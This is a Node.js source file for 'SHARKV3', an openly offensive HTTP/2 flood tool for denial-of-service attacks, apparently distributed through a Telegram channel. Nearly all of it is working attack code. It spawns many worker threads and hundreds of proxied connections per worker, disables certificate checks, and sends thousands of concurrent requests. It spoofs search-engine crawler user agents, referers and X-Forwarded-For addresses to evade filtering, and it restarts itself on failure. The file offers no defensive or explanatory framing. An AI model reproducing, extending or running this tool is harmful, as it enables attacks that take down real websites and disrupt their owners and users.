// SHARKV3 - T.ME/STSVKINGDOM w/ Proxy Support
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');

const THREADS = 22;
const POWER_MULTIPLIER = 2;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 100;
const MAX_RESTARTS = 20;
const proxies = fs.readFileSync('proxies.txt', 'utf-8').split(/\r?\n/).filter(Boolean);

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function getRandomInRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomUserAgent() {
    const bots = ['Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Baiduspider', 'Sogou', 'Exabot', 'facebot', 'Twitterbot', 'Applebot'];
    const bot = bots[Math.floor(Math.random() * bots.length)];
    const version = `${getRandomInRange(1, 10)}.${getRandomInRange(1, 10)}`;
    const osOptions = ['Linux', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7'];
    const os = osOptions[Math.floor(Math.random() * osOptions.length)];
    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) ${bot}/${version} (+http://${bot.toLowerCase().replace('bot', '')}.com/bot.html)`;
}

function getRandomReferer() {
    const referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://search.yahoo.com/', 'https://duckduckgo.com/', 'https://www.baidu.com/', 'https://www.yandex.com/', 'https://www.facebook.com/', 'https://twitter.com/', 'https://www.linkedin.com/', 'https://www.reddit.com/'];
    return referers[Math.floor(Math.random() * referers.length)];
}

function getRandomPath() {
    const paths = ['/', '/home', '/about', '/products', '/login', '/search?q=' + Math.random().toString(36).substring(7), '/blog/' + Math.random().toString(36).substring(7)];
    return paths[Math.floor(Math.random() * paths.length)];
}

function getRandomIP() {
    return Array.from({ length: 4 }, () => getRandomInRange(1, 254)).join('.');
}

function getRandomHeaders() {
    return {
        ':method': 'GET',
        ':path': getRandomPath(),
        'user-agent': generateRandomUserAgent(),
        'referer': getRandomReferer(),
        'x-forwarded-for': getRandomIP()
    };
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }
    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    end = Date.now() + duration * 1000;

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);

    let restartCount = 0;
    function startWorkers() {
        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, connections: getRandomInRange(200, 500) } });
        }
        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            new Worker(__filename, { workerData: { target, duration, connections: getRandomInRange(154, 500) } });
        }
    }
    startWorkers();

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        const secondsRemaining = Math.floor((end - Date.now()) / 1000);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${secondsRemaining}s`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

    process.on('uncaughtException', () => {
        if (++restartCount <= MAX_RESTARTS) {
            console.log(`[!] Restarting (${restartCount}/${MAX_RESTARTS})...`);
            startWorkers();
        } else {
            console.log('[x] Max restarts reached.');
            process.exit(1);
        }
    });
} else {
    const { target, duration, connections } = workerData;
    const endTime = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const headers = getRandomHeaders();
                const req = client.request(headers);

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });
                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), getRandomInRange(1, 5));
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const [host, port] = proxy.split(':');

        const targetUrl = new URL(target);
        const targetHost = targetUrl.hostname;
        const targetPort = 443;

        const proxySocket = net.connect(port, host);
        proxySocket.setTimeout(5000);
        proxySocket.once('error', () => setTimeout(createConnection, 500));
        proxySocket.once('timeout', () => proxySocket.destroy());

        proxySocket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`);

        proxySocket.once('data', res => {
            if (!res.toString().includes('200')) return proxySocket.destroy();

            const tlsSocket = tls.connect({
                socket: proxySocket,
                servername: targetHost,
                rejectUnauthorized: false
            });

            const client = http2.connect(target, { createConnection: () => tlsSocket });
            const inflight = { count: 0 };

            client.on('error', () => { client.destroy(); });
            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 500));
            client.on('connect', () => {
                for (let i = 0; i < connections; i++) sendLoop(client, inflight);
            });
        });
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
                          }
